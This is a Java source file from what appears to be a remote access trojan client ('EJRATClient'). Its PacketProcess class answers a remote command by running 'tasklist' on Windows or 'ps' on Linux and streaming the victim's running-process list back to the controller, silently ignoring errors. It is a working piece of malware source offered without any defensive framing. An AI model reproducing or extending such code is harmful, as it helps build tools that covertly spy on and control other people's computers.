package ej.ratclient.packet.impl;

import ej.ratclient.EJRATClient;
import ej.ratclient.packet.PacketType;
import ej.ratclient.packet.PacketBuilder;
import ej.ratclient.packet.Packet;
import ej.ratclient.util.OperatingSystem;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class PacketProcess implements PacketType {

    @Override
    public void handlePacket(Packet packet) {
        Process proc = null;
        try {
            switch (OperatingSystem.OPERATING_SYSTEM) {
                case WINDOWS:
                    proc = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe /fo csv /nh");
                    break;
                case MAC:
                    break;
                case LINUX:
                    proc = Runtime.getRuntime().exec("ps -s");
                    break;
            }
            String read;
            BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            while ((read = input.readLine()) != null) {
                String[] split = read.split("\"");
                PacketBuilder builder = new PacketBuilder(2);
                builder.putString(split[1]).putString(split[3]).putString(split[9]);
                EJRATClient.get().out.write(builder.toPacket().getPayload());
            }
        } catch (Exception ignored) {
        }
    }
}
